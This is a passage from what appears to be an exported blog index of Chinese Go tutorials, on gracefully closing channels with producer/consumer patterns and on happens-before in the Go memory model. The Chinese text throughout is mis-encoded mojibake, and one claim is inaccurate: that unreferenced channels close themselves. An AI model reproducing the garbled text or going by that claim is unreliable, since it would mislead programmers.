{\n\t\tclose(mc.C)\n\t})\n}\n```\n\n\n\nè¦çŸ¥é“golangçš„è®¾è®¡è€…ä¸æä¾›SafeCloseæˆ–è€…SafeSendæ–¹æ³•æ˜¯æœ‰åŸå› çš„ï¼Œä»–ä»¬æœ¬æ¥å°±ä¸æ¨èåœ¨æ¶ˆè´¹ç«¯æˆ–è€…åœ¨å¹¶å‘çš„å¤šä¸ªç”Ÿäº§ç«¯å…³é—­channelï¼Œæ¯”å¦‚å…³é—­åªè¯»channelåœ¨è¯­æ³•ä¸Šå°±å½»åº•è¢«ç¦æ­¢ä½¿ç”¨äº†ã€‚\n\n \n\n### ä¼˜é›…çš„å…³é—­Channelçš„æ–¹æ³•\n\nä¸Šæ–‡çš„SafeSendæ–¹æ³•ä¸€ä¸ªå¾ˆå¤§çš„åŠ£åŠ¿åœ¨äºå®ƒä¸èƒ½ç”¨åœ¨selectå—çš„caseè¯­å¥ä¸­ã€‚è€Œå¦ä¸€ä¸ªå¾ˆé‡è¦çš„åŠ£åŠ¿åœ¨äºåƒæˆ‘è¿™æ ·å¯¹ä»£ç æœ‰æ´ç™–çš„äººæ¥è¯´ï¼Œä½¿ç”¨panic/recoverå’Œsync/mutexæ¥æå®šä¸æ˜¯é‚£ä¹ˆçš„ä¼˜é›…ã€‚ä¸‹é¢æˆ‘ä»¬å¼•å…¥åœ¨ä¸åŒçš„åœºæ™¯ä¸‹å¯ä»¥ä½¿ç”¨çš„çº¯ç²¹çš„ä¼˜é›…çš„è§£å†³æ–¹æ³•ã€‚\n\n \n\n#### å¤šä¸ªæ¶ˆè´¹è€…ï¼Œå•ä¸ªç”Ÿäº§è€…ã€‚\n\nè¿™ç§æƒ…å†µæœ€ç®€å•ï¼Œç›´æ¥è®©ç”Ÿäº§è€…å…³é—­channelå¥½äº†ã€‚ \n\n\n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumReceivers = 100\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(NumReceivers)\n\t\n\n\tdataCh := make(chan int, 100)\n\t\n\t// ä¸€ä¸ªç”Ÿäº§è€…\n\tgo func() {\n\t\tfor {\n\t\t\tif value := rand.Intn(MaxRandomNumber); value == 0 {\n\t\t\t\tclose(dataCh)\n\t\t\t\treturn\n\t\t\t} else {\t\t\t\n\t\t\t\tdataCh <- value\n\t\t\t}\n\t\t}\n\t}()\n\t\n\t// å¤šä¸ªæ¶ˆè´¹è€…\n\tfor i := 0; i < NumReceivers; i++ {\n\t\tgo func() {\n\t\t\tdefer wgReceivers.Done()\n\t\t\t\n\t\t\tfor value := range dataCh {\n\t\t\t\tlog.Println(value)\n\t\t\t}\n\t\t}()\n\t}\n\t\n\twgReceivers.Wait()\n}\n```\n\n\n\n#### å¤šä¸ªç”Ÿäº§è€…ï¼Œå•ä¸ªæ¶ˆè´¹è€…ã€‚\n\nè¿™ç§æƒ…å†µè¦æ¯”ä¸Šé¢çš„å¤æ‚ä¸€ç‚¹ã€‚æˆ‘ä»¬ä¸èƒ½åœ¨æ¶ˆè´¹ç«¯å…³é—­channelï¼Œå› ä¸ºè¿™è¿èƒŒäº†channelå…³é—­åŸåˆ™ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è®©æ¶ˆè´¹ç«¯å…³é—­ä¸€ä¸ªé™„åŠ çš„ä¿¡å·æ¥é€šçŸ¥å‘é€ç«¯åœæ­¢ç”Ÿäº§æ•°æ®ã€‚\n\n\n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumSenders = 1000\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(1)\n\t\n\t\n\tdataCh := make(chan int, 100)\n\tstopCh := make(chan struct{})\n\t\n\t\n\t// å¤šä¸ªç”Ÿäº§è€…\n\tfor i := 0; i < NumSenders; i++ {\n\t\tgo func() {\n\t\t\tfor {\n\t\t\n\t\t\t\t// ç›®çš„æ˜¯å°è¯•é€€å‡º, å› ä¸ºè¶Šæ—©è¶Šå¥½, æ­¤å¤„å¯ä»¥çœç•¥, å› ä¸ºå°±ç®—å¤šå‘é€äº†å€¼, æ¶ˆè´¹è€…ä¹Ÿä¸ä¼šç†ä¼šäº†\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\n\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase dataCh <- rand.Intn(MaxRandomNumber):\n\t\t\t\t}\n\t\t\t}\n\t\t}()\n\t}\n\t\n\t// ä¸€ä¸ªæ¶ˆè´¹è€…\n\tgo func() {\n\t\tdefer wgReceivers.Done()\n\t\t\n\t\tfor value := range dataCh {\n\t\t\tif value == MaxRandomNumber-1 {\n\t\t\t\t\n\t\t\t\t// è¿™é‡Œå³æ˜¯dataCh çš„æ¶ˆè´¹è€…, ä¹Ÿæ˜¯ stopCh çš„ç”Ÿäº§è€…\n\t\t\t\tclose(stopCh)\n\t\t\t\treturn\n\t\t\t}\n\t\t\t\n\t\t\tlog.Println(value)\n\t\t}\n\t}()\n\t\n\t\n\twgReceivers.Wait()\n}\n```\n\n\n\nå°±ä¸Šé¢è¿™ä¸ªä¾‹å­ï¼Œç”Ÿäº§è€…åŒæ—¶ä¹Ÿæ˜¯é€€å‡ºä¿¡å·channelçš„æ¥å—è€…ï¼Œé€€å‡ºä¿¡å·channelä»ç„¶æ˜¯ç”±å®ƒçš„ç”Ÿäº§ç«¯å…³é—­çš„ï¼Œæ‰€ä»¥è¿™ä»ç„¶æ²¡æœ‰è¿èƒŒ**channelå…³é—­åŸåˆ™**ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªä¾‹å­ä¸­ç”Ÿäº§ç«¯å’Œæ¥å—ç«¯éƒ½æ²¡æœ‰å…³é—­æ¶ˆæ¯æ•°æ®çš„channelï¼Œchannelåœ¨æ²¡æœ‰ä»»ä½•goroutineå¼•ç”¨çš„æ—¶å€™ä¼šè‡ªè¡Œå…³é—­ï¼Œè€Œä¸éœ€è¦æ˜¾ç¤ºè¿›è¡Œå…³é—­ã€‚\n\n \n\n####  å¤šä¸ªç”Ÿäº§è€…ï¼Œå¤šä¸ªæ¶ˆè´¹è€…\n\n \n\nè¿™æ˜¯æœ€å¤æ‚çš„ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬æ—¢ä¸èƒ½è®©æ¥å—ç«¯ä¹Ÿä¸èƒ½è®©å‘é€ç«¯å…³é—­channelã€‚æˆ‘ä»¬ç”šè‡³éƒ½ä¸èƒ½è®©æ¥å—è€…å…³é—­ä¸€ä¸ªé€€å‡ºä¿¡å·æ¥é€šçŸ¥ç”Ÿäº§è€…åœæ­¢ç”Ÿäº§ã€‚å› ä¸ºæˆ‘ä»¬ä¸èƒ½è¿å**channelå…³é—­åŸåˆ™**ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¼•å…¥ä¸€ä¸ªé¢å¤–çš„åè°ƒè€…æ¥å…³é—­é™„åŠ çš„é€€å‡ºä¿¡å·channelã€‚  \n\n \n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n\t\"strconv\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumReceivers = 10\n\tconst NumSenders = 1000\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(NumReceivers)\n\t\n\t\n\tdataCh := make(chan int, 100)\n\tstopCh := make(chan struct{}) //ç”Ÿäº§è€…æ˜¯ä¸»æŒäºº, æ¶ˆè´¹è€…æ˜¯ (dataChæ‰€æœ‰ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…)\n\t\n\ttoStop := make(chan string, 1) //ä½œç”¨æ˜¯é€šçŸ¥ä¸»æŒäººå»å…³é—­stopCh, ç”Ÿäº§è€…æ˜¯ (dataChæ‰€æœ‰ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…) æ¶ˆè´¹è€…æ˜¯ä¸»æŒäºº\n\t\t\n\t\n\tvar stoppedBy string\n\t\n\t// ä¸»æŒäºº\n\tgo func() {\n\t\tstoppedBy = <- toStop\n\t\tclose(stopCh)\n\t}()\n\t\n\t// å¤šä¸ªç”Ÿäº§è€…\n\tfor i := 0; i < NumSenders; i++ {\n\t\tgo func(id string) {\n\t\t\tfor {\n\t\t\t\tvalue := rand.Intn(MaxRandomNumber)\n\t\t\t\tif value == 0 {\n\t\t\t\t\t//é€šçŸ¥ä¸»æŒäººå»å¹²å…³é—­çš„æ´»\n\t\t\t\t\tselect {\n\t\t\t\t\tcase toStop <- \"sender#\" + id:\n\t\t\t\t\tdefault:\n\t\t\t\t\t}\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\n                //å°è¯•å°½æ—©é€€å‡º, è¿™é‡Œä¸èƒ½çœç•¥, å› ä¸ºå¯èƒ½ä¼šå¯¼è‡´å¤šå‘é€ä¸€æ¬¡\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\t\n\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase dataCh <- value:\n\t\t\t\t}\n\t\t\t}\n\t\t}(strconv.Itoa(i))\n\t}\n\t\n\t// å¤šä¸ªæ¶ˆè´¹è€…\n\tfor i := 0; i < NumReceivers; i++ {\n\t\tgo func(id string) {\n\t\t\tdefer wgReceivers.Done()\n\t\t\t\n\t\t\tfor {\n\t\t\t\t//å°è¯•å°½æ—©é€€å‡º, è¿™é‡Œä¸èƒ½çœç•¥, å› ä¸ºå¯èƒ½ä¼šå¯¼è‡´å¤šæ¥æ”¶ä¸€æ¬¡\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\n\t\t\t\t//æ³¨æ„æ­¤å¤„å¦‚æœ stopCh å…³é—­äº†, ä¸‹é¢ä¹Ÿæœ‰èƒ½ return ä¸äº†\n                //å› ä¸ºdataChä¹Ÿæœ‰å¯èƒ½select åˆ°, æ‰€ä»¥ä¸Šä¸€ä¸ª selectè¯­å¥ä¸èƒ½çœç•¥\n                \n                \n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase value := <-dataCh:\n\t\t\t\t\tif value == MaxRandomNumber-1 {\n\t\t\t\t\t\t//é€šçŸ¥ä¸»æŒäººå»å¹²å…³é—­çš„æ´»\n\t\t\t\t\t\tselect {\n\t\t\t\t\t\tcase toStop <- \"receiver#\" + id:\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t}\n\t\t\t\t\t\treturn\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tlog.Println(value)\n\t\t\t\t}\n\t\t\t}\n\t\t}(strconv.Itoa(i))\n\t}\n\t\n\t\n\twgReceivers.Wait()\n\tlog.Println(\"stopped by\", stoppedBy)\n}\n```\n\n\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä»ç„¶éµå®ˆç€*channel closing principle*ã€‚ è¯·æ³¨æ„channelÂ `toStop`çš„ç¼“å†²å¤§å°æ˜¯1.è¿™æ˜¯ä¸ºäº†é¿å…å½“mederator goroutine å‡†å¤‡å¥½ä¹‹å‰ç¬¬ä¸€ä¸ªé€šçŸ¥å°±å·²ç»å‘é€äº†ï¼Œå¯¼è‡´ä¸¢å¤±ã€‚\n\n\n\n#### **ç»“è®º**\n\næ²¡æœ‰ä»»ä½•åœºæ™¯å€¼å¾—ä½ å»æ‰“ç ´channelå…³é—­åŸåˆ™ï¼Œå¦‚æœä½ é‡åˆ°è¿™æ ·çš„ä¸€ç§ç‰¹æ®Šåœºæ™¯ï¼Œè¿˜æ˜¯å»ºè®®ä½ å¥½å¥½æ€è€ƒä¸€ä¸‹è‡ªå·±è®¾è®¡ï¼Œæ˜¯ä¸æ˜¯è¯¥é‡æ„ä¸€ä¸‹äº†ã€‚\n\n\n\n\n\n#### [ä¸ªäººç–‘é—®è§£ç­”](https://www.jianshu.com/p/d24dfbb33781)\n\næ¥¼ä¸»ä½ å¥½, å…³äºç¬¬ä¸‰ä¸ªä¾‹å­æœ‰äº›é—®é¢˜è¯·æ•™\n\n1. value==0æ—¶, ä¸ºä»€ä¹ˆè¿˜è¦åŠ ä¸ªselect, ä¸èƒ½ç›´æ¥å‘é€ç»™toStopå—?\n\n```\nif value == 0 {\nselect {\ncase toStop <- \"sender#\" + id:\ndefault:\n}\nreturn\n}\n```\n> å› ä¸ºå¯èƒ½å¤šä¸ªç”Ÿäº§è€…æˆ–è€…å¤šä¸ªæ¶ˆè´¹è€…æ»¡è¶³æ¡ä»¶, é˜²æ­¢é˜»å¡\n\n\n\n2. select stopCh ä¸ºä»€ä¹ˆå†™äº†ä¸¤æ¬¡? ç¬¬ä¸€ä¸ªselectå¯ä»¥çœç•¥å—?\n\n```\nselect {\ncase <- stopCh:\n\treturn\ndefault:\n}\n\nselect {\ncase <- stopCh:\n\treturn\ncase dataCh <- value:\n}\n```\n> ä¸ºäº†å°½æ—©é€€å‡º, å› ä¸ºç¬¬äºŒä¸ª Selectæœ‰å¯èƒ½ select åˆ°dataCh, è™½ç„¶å·²ç»é€šçŸ¥å…³é—­äº†\n\n\n\n3. toStopçš„ç¼“å†²å¤§å°æ˜¯1, ä¸ºäº†é¿å…å‡†å¤‡å¥½ä¹‹å‰é€šçŸ¥å°±å‘é€äº†æ€ä¹ˆç†è§£??\n\n   è¯·æ³¨æ„channel toStopçš„ç¼“å†²å¤§å°æ˜¯1.è¿™æ˜¯ä¸ºäº†é¿å…å½“mederator goroutine å‡†å¤‡å¥½ä¹‹å‰ç¬¬ä¸€ä¸ªé€šçŸ¥å°±å·²ç»å‘é€äº†ï¼Œå¯¼è‡´ä¸¢å¤±ã€‚\n\n> å› ä¸ºæœ‰ç¼“å†²çš„ å‘é€ happens_before æ¥æ”¶ä¹‹å‰, æ‰€ä»¥mederatorèƒ½ä¿è¯æ¥æ”¶åˆ°æ•°æ®\n>\n> æ— ç¼“å†²çš„ æ¥æ”¶ happens_before å‘é€ä¹‹é—´,  å¯èƒ½ä¼šä¸¢å¤±æ•°æ®","tags":["golang"],"categories":["1_golangåŸºç¡€"]},{"title":"golangå†…å­˜æ¨¡å‹å’Œhappens_before","url":"%2Fp%2F6196d525.html","content":"\n\n\n### happens-before æœ¯è¯­\n\nhappens-beforeæ˜¯ä¸€ä¸ªæœ¯è¯­ï¼Œå¹¶ä¸ä»…ä»…æ˜¯Goè¯­è¨€æ‰æœ‰çš„ã€‚ç®€å•çš„è¯´ï¼Œé€šå¸¸çš„å®šä¹‰å¦‚ä¸‹ï¼š\n\nå‡è®¾Aå’ŒBè¡¨ç¤ºä¸€ä¸ªå¤šçº¿ç¨‹çš„ç¨‹åºæ‰§è¡Œçš„ä¸¤ä¸ªæ“ä½œã€‚å¦‚æœA happens-before Bï¼Œé‚£ä¹ˆAæ“ä½œå¯¹å†…å­˜çš„å½±å“ å°†å¯¹æ‰§è¡ŒBçš„çº¿ç¨‹(ä¸”æ‰§è¡ŒBä¹‹å‰)å¯è§ã€‚ \n\n\n\n+ æ— è®ºä½¿ç”¨å“ªç§ç¼–ç¨‹è¯­è¨€ï¼Œæœ‰ä¸€ç‚¹æ˜¯ç›¸åŒçš„ï¼šå¦‚æœæ“ä½œAå’ŒBåœ¨ç›¸åŒçš„çº¿ç¨‹ä¸­æ‰§è¡Œï¼Œå¹¶ä¸”Aæ“ä½œçš„å£°æ˜åœ¨Bä¹‹å‰ï¼Œé‚£ä¹ˆA happens-before Bã€‚\n\n```\nint A, B;\nvoid foo()\n{\n  // This store to A ...\n  A = 5;\n  // ... effectively becomes visible before the following loads. Duh!\n  B = A * A;\n}\n```\n\n \n\n+ è¿˜æœ‰ä¸€ç‚¹æ˜¯ï¼Œåœ¨æ¯é—¨è¯­è¨€ä¸­ï¼Œæ— è®ºä½ ä½¿ç”¨é‚£ç§æ–¹å¼è·å¾—ï¼Œhappens-beforeå…³ç³»éƒ½æ˜¯å¯ä¼ é€’çš„ï¼šå¦‚æœA happens-before Bï¼ŒåŒæ—¶B happens-before Cï¼Œé‚£ä¹ˆA happens-before Cã€‚å½“è¿™äº›å…³ç³»å‘ç”Ÿåœ¨ä¸åŒçš„çº¿ç¨‹ä¸­ï¼Œä¼ é€’æ€§å°†å˜å¾—éå¸¸æœ‰ç”¨ã€‚\n\n<!-- more -->\n\n\n\nåˆšæ¥è§¦è¿™ä¸ªæœ¯è¯­çš„äººæ€»æ˜¯å®¹æ˜“è¯¯è§£ï¼Œè¿™é‡Œå¿…é¡»æ¾„æ¸…çš„æ˜¯ï¼Œhappens-beforeå¹¶ä¸æ˜¯æŒ‡æ—¶åºå…³ç³»ï¼Œå¹¶ä¸æ˜¯è¯´A happens-before Bå°±è¡¨ç¤ºæ“ä½œAåœ¨æ“ä½œBä¹‹å‰å‘ç”Ÿã€‚å®ƒå°±æ˜¯ä¸€ä¸ªæœ¯è¯­ï¼Œå°±åƒå…‰å¹´ä¸æ˜¯æ—¶é—´å•ä½ä¸€æ ·ã€‚å…·ä½“åœ°è¯´ï¼š\n\n1.  **A happens-before Bå¹¶ä¸æ„å‘³ç€Aåœ¨Bä¹‹å‰å‘ç”Ÿã€‚**\n2.  **Aåœ¨Bä¹‹å‰å‘ç”Ÿå¹¶ä¸æ„å‘³ç€A happens-before Bã€‚**\n\nè¿™ä¸¤ä¸ªé™ˆè¿°çœ‹ä¼¼çŸ›ç›¾ï¼Œå…¶å®å¹¶ä¸æ˜¯ã€‚å¦‚æœä½ è§‰å¾—å¾ˆå›°æƒ‘ï¼Œå¯ä»¥å¤šè¯»å‡ ç¯‡å®ƒçš„å®šä¹‰ã€‚åé¢æˆ‘ä¼šè¯•ç€è§£é‡Šè¿™ç‚¹ã€‚è®°ä½ï¼Œhappens-before æ˜¯ä¸€ç³»åˆ—è¯­è¨€è§„èŒƒä¸­å®šä¹‰çš„æ“ä½œé—´çš„å…³ç³»ã€‚å®ƒå’Œæ—¶é—´çš„æ¦‚å¿µç‹¬ç«‹ã€‚è¿™å’Œæˆ‘ä»¬é€šå¸¸è¯´â€Aåœ¨Bä¹‹å‰å‘ç”Ÿâ€æ—¶è¡¨è¾¾çš„çœŸå®ä¸–ç•Œä¸­äº‹ä»¶çš„æ—¶é—´é¡ºåºä¸åŒã€‚\n\n\n\n### A happens-before Bå¹¶ä¸æ„å‘³ç€Aåœ¨Bä¹‹å‰å‘ç”Ÿ (ç¼–è¯‘å™¨å¯èƒ½ä¼šé‡æ’)\n\n\n\nè¿™é‡Œæœ‰ä¸ªä¾‹å­ï¼Œå…¶ä¸­çš„æ“ä½œå…·æœ‰happens-beforeå…³ç³»ï¼Œä½†æ˜¯å®é™…ä¸Šå¹¶ä¸ä¸€å®šæ˜¯æŒ‰ç…§é‚£ä¸ªé¡ºåºå‘ç”Ÿçš„ã€‚ä¸‹é¢çš„ä»£ç æ‰§è¡Œäº†(1)å¯¹Açš„èµ‹å€¼ï¼Œç´§æ¥ç€æ˜¯(2)å¯¹Bçš„èµ‹å€¼ã€‚\n\n```\nint A = 0;\nint B = 0;\nvoid main()\n{\n    A = B + 1; // (1)\n    B = 1; // (2)\n}\n```\n\n\n\næ ¹æ®å‰é¢è¯´æ˜çš„è§„åˆ™ï¼Œ(1) happens-before (2)ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨gcc -O2ç¼–è¯‘è¿™ä¸ªä»£ç ï¼Œç¼–è¯‘å™¨å°†äº§ç”Ÿä¸€äº›æŒ‡ä»¤é‡æ’åºã€‚æœ‰å¯èƒ½æ‰§è¡Œé¡ºåºæ˜¯è¿™æ ·å­çš„ï¼š\n\n```\nå°†Bçš„å€¼å–åˆ°å¯„å­˜å™¨\nå°†Bèµ‹å€¼ä¸º1\nå°†å¯„å­˜å™¨å€¼åŠ 1åèµ‹å€¼ç»™A\n```\n\nä¹Ÿå°±æ˜¯åˆ°ç¬¬äºŒæ¡æœºå™¨æŒ‡ä»¤(å¯¹Bçš„èµ‹å€¼)å®Œæˆæ—¶ï¼Œå¯¹Açš„èµ‹å€¼è¿˜æ²¡æœ‰å®Œæˆã€‚æ¢å¥è¯è¯´ï¼Œ(1)å¹¶æ²¡æœ‰åœ¨(2)ä¹‹å‰å‘ç”Ÿ!\n\né‚£ä¹ˆï¼Œè¿™é‡Œè¿åäº†happens-beforeå…³ç³»äº†å—ï¼Ÿè®©æˆ‘ä»¬æ¥åˆ†æä¸‹ï¼Œæ ¹æ®å®šä¹‰ï¼Œæ“ä½œ(1)å¯¹å†…å­˜çš„å½±å“å¿…é¡»åœ¨æ“ä½œ(2)æ‰§è¡Œä¹‹å‰å¯¹å…¶å¯è§ã€‚æ¢å¥è¯è¯´ï¼Œå¯¹Açš„èµ‹å€¼å¿…é¡»æœ‰æœºä¼šå¯¹Bçš„èµ‹å€¼æœ‰å½±å“.\n\nä½†æ˜¯åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¯¹Açš„èµ‹å€¼å…¶å®å¹¶æ²¡æœ‰å¯¹Bçš„èµ‹å€¼æœ‰å½±å“ã€‚å³ä¾¿(1)çš„å½±å“çœŸçš„å¯è§ï¼Œ(2)çš„è¡Œä¸ºè¿˜æ˜¯ä¸€æ ·ã€‚æ‰€ä»¥ï¼Œè¿™å¹¶ä¸èƒ½ç®—æ˜¯è¿èƒŒhappens-beforeè§„åˆ™ã€‚\n\n\n\n### Aåœ¨Bä¹‹å‰å‘ç”Ÿå¹¶ä¸æ„å‘³ç€A happens-before B (è™½ç„¶åœ¨ä¹‹å‰å‘ç”Ÿä½†ä¸æ»¡è¶³è§„åˆ™)\n\nä¸‹é¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ‰€æœ‰çš„æ“ä½œæŒ‰ç…§æŒ‡å®šçš„é¡ºåºå‘ç”Ÿï¼Œä½†æ˜¯å¹¶èƒ½ä¸æ„æˆhappens-before å…³ç³»ã€‚å‡è®¾ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨pulishMessageï¼ŒåŒæ—¶ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨consumeMessageã€‚ ç”±äºæˆ‘ä»¬å¹¶è¡Œçš„æ“ä½œå…±äº«å˜é‡ï¼Œä¸ºäº†ç®€å•ï¼Œæˆ‘ä»¬å‡è®¾æ‰€æœ‰å¯¹intç±»å‹çš„å˜é‡çš„æ“ä½œéƒ½æ˜¯åŸå­çš„ã€‚\n\n\n\n```\nint isReady = 0;\nint answer = 0;\nvoid publishMessage()\n{\n  answer = 42; // (1)\n  isReady = 1; // (2)\n}\nvoid consumeMessage()\n{\n  if (isReady)\t\t\t    // (3) <-- Let's suppose this line reads 1\n  \tprintf(\"%d\\n\", answer); // (4)\n}\n```\n\n\n\næ ¹æ®ç¨‹åºçš„é¡ºåºï¼Œåœ¨(1)å’Œ(2)ä¹‹é—´å­˜åœ¨happens-before å…³ç³»ï¼ŒåŒæ—¶åœ¨(3)å’Œ(4)ä¹‹é—´ä¹Ÿå­˜åœ¨happens-beforeå…³ç³»ã€‚\n\n\n\né™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬å‡è®¾åœ¨è¿è¡Œæ—¶ï¼ŒisReadyè¯»åˆ°1(æ˜¯ç”±å¦ä¸€ä¸ªçº¿ç¨‹åœ¨(2)ä¸­èµ‹çš„å€¼)ã€‚åœ¨è¿™ä¸­æƒ…å½¢ä¸‹ï¼Œæˆ‘ä»¬å¯çŸ¥(2)ä¸€å®šåœ¨(3)ä¹‹å‰å‘ç”Ÿã€‚ä½†æ˜¯è¿™å¹¶ä¸æ„å‘³ç€åœ¨(2)å’Œ(3)ä¹‹é—´å­˜åœ¨happens-before å…³ç³»!\n\nhappens-before å…³ç³»åªåœ¨è¯­è¨€æ ‡å‡†ä¸­å®šä¹‰çš„åœ°æ–¹å­˜åœ¨ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰ç›¸å…³çš„è§„åˆ™è¯´æ˜(2)å’Œ(3)ä¹‹é—´å­˜åœ¨happens-beforeå…³ç³»ï¼Œå³ä¾¿(3)è¯»åˆ°äº†(2)èµ‹çš„å€¼ã€‚\n\nè¿˜æœ‰ï¼Œç”±äº(2)å’Œ(3)ä¹‹é—´ï¼Œ(1)å’Œ(4)ä¹‹é—´éƒ½ä¸å­˜åœ¨happens-beforeå…³ç³»ï¼Œé‚£ä¹ˆ(1)å’Œ(4)çš„å†…å­˜äº¤äº’ä¹Ÿå¯èƒ½è¢«é‡æ’åº (è¦ä¸ç„¶æ¥è‡ªç¼–è¯‘å™¨çš„æŒ‡ä»¤é‡æ’åºï¼Œè¦ä¸ç„¶æ¥è‡ªå¤„ç†å™¨è‡ªèº«çš„å†…å­˜é‡æ’åº)ã€‚é‚£æ ·çš„è¯ï¼Œå³ä½¿(3)è¯»åˆ°1ï¼Œ(4)ä¹Ÿä¼šæ‰“å°å‡ºâ€œ0â€œã€‚\n\n \n\n### Goå…³äºåŒæ­¥çš„è§„åˆ™ (å¾€å†°ç®±æ”¾è¥¿ç“œ, å…ˆæ”¾åæ‹¿,å¾€æ‰‹é‡Œé€’è¥¿ç“œ, å…ˆæ¥åæ”¾)\n\n\n\nå…³äºchannelçš„happens-beforeåœ¨Goçš„å†…å­˜æ¨¡å‹ä¸­æåˆ°äº†ä¸‰ç§æƒ…å†µï¼š\n\n- å¯¹ä¸€ä¸ªchannelçš„å‘é€æ“ä½œ happens-before ç›¸åº”channelçš„æ¥æ”¶æ“ä½œå®Œæˆ     \t  **(å¾€å†°ç®±æ”¾è¥¿ç“œ, å…ˆæ”¾åæ‹¿)**\n- å…³é—­ä¸€ä¸ªchannel happens-before ä»è¯¥Channelæ¥æ”¶åˆ°æœ€åçš„è¿”å›å€¼0                \n\n- ä¸å¸¦ç¼“å†²çš„channelçš„æ¥æ”¶æ“ä½œ happens-before ç›¸åº”channelçš„å‘é€æ“ä½œå®Œæˆ      **(å¾€æ‰‹é‡Œé€’è¥¿ç“œ, å…ˆæ¥åæ”¾) **     \n\n\n\nå…ˆçœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š\n\n```\nvar c = make(chan int, 10)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    c <- 0  // (2)\n}\nfunc main() {\n    go f()\n    <-c   // (3)\n    print(a)  // (4)\n}\n```\n\nä¸Šè¿°ä»£ç å¯ä»¥ç¡®ä¿è¾“å‡º\"hello, world\"ï¼Œå› ä¸º(1) happens-before (2)ï¼Œ(4) happens-after (3)ï¼Œå†æ ¹æ®ä¸Šé¢çš„ç¬¬ä¸€æ¡è§„åˆ™(2)æ˜¯ happens-before (3)çš„ï¼Œæœ€åæ ¹æ®happens-beforeçš„å¯ä¼ é€’æ€§ï¼Œäºæ˜¯æœ‰(1) happens-before (4)ï¼Œä¹Ÿå°±æ˜¯a = \"hello, world\" happens-before print(a)ã€‚\n\n\n\nå†çœ‹å¦ä¸€ä¸ªä¾‹å­ï¼š\n\n```\nvar c = make(chan int)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    <-c   // (2)\n}\nfunc main() {\n    go f()\n    c <- 0  // (3)\n    print(a)  // (4)\n}\n```\n\næ ¹æ®ä¸Šé¢çš„ç¬¬ä¸‰æ¡è§„åˆ™(2) happens-before (3)ï¼Œæœ€ç»ˆå¯ä»¥ä¿è¯(1) happens-before (4)ã€‚\n\n\n\n\n\nå¦‚æœæˆ‘æŠŠä¸Šé¢çš„ä»£ç ç¨å¾®æ”¹ä¸€ç‚¹ç‚¹ï¼Œå°†cå˜ä¸ºä¸€ä¸ªå¸¦ç¼“å­˜çš„channelï¼Œåˆ™print(a)æ‰“å°çš„ç»“æœä¸èƒ½å¤Ÿä¿è¯æ˜¯\"hello world\"ã€‚\n\n```\nvar c = make(chan int, 1)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    <-c   // (2)\n}\nfunc main() {\n    go f()\n    c <- 0  // (3)\n    print(a)  // (4)\n}\n```\n\nå› ä¸ºè¿™é‡Œä¸å†æœ‰ä»»ä½•åŒæ­¥ä¿è¯ï¼Œä½¿å¾—(2) happens-before (3)ã€‚å¯ä»¥å›å¤´åˆ†æä¸€ä¸‹æœ¬èŠ‚æœ€å‰é¢çš„ä¾‹å­ï¼Œä¹Ÿæ˜¯æ²¡æœ‰ä¿è¯happens-beforeæ¡ä»¶ã€‚\n\n\n\n\n\n### golang happen before çš„ä¿è¯\n\n\n\n**1) å•çº¿ç¨‹**\n\n\n\n**2) Init å‡½æ•°**\n\n- å¦‚æœåŒ…P1ä¸­å¯¼å…¥äº†åŒ…P2ï¼Œåˆ™P2ä¸­çš„initå‡½æ•°Happens Before æ‰€æœ‰P1ä¸­çš„æ“ä½œ\n- mainå‡½æ•°Happens After 